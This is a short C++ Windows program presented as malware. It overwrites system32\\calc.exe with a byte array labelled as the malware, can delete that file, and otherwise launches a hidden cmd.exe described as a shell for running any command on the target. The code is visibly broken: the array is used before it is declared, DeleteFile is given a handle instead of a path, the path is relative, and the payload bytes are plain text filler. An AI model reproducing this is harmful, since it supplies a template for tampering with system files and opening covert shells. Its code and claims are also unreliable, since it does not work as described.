#include <iostream>
#include <windows.h>
using namespace std;

// Function to copy the malware to the system directory
void CopyMalwareToSystem() {
    // Get a handle to the file we want to copy
    HANDLE hFile = CreateFileW(L"system32\\calc.exe", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    // Write the malware to the file
    DWORD writeBytes;
    WriteFile(hFile, &Malware, sizeof(Malware), &writeBytes, nullptr);

    // Close the file handle
    CloseHandle(hFile);
}

// Function to delete the malware from the system directory
void DeleteMalwareFromSystem() {
    // Get a handle to the file we want to delete
    HANDLE hFile = CreateFileW(L"system32\\calc.exe", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    // Delete the file
    DeleteFile(hFile);

    // Close the file handle
    CloseHandle(hFile);
}

// Function to execute a command shell that can be used to execute any command on the target computer
void ExecuteCommandShell() {
    // Create a new process with the name "cmd.exe"
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    CreateProcessW(NULL, L"cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    // Wait until the process ends
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close the process handle
    CloseHandle(pi.hProcess);
}

// The malware itself
char Malware[] = {
    0x48, 0x65, 0x78, 0x63, 0x6f, 0x6c, 0x65, 0x2e, 0x2e, 0x2e, 0x2e
};

int main(int argc, char *argv[]) {
    // Check if the user wants to copy the malware to the system directory
    if (strcmp(argv[1], "/system") == 0) {
        CopyMalwareToSystem();
    } else if (strcmp(argv[1], "/delete") == 0) {
        DeleteMalwareFromSystem();
    } else {
        ExecuteCommandShell();
    }

    return 0;
}
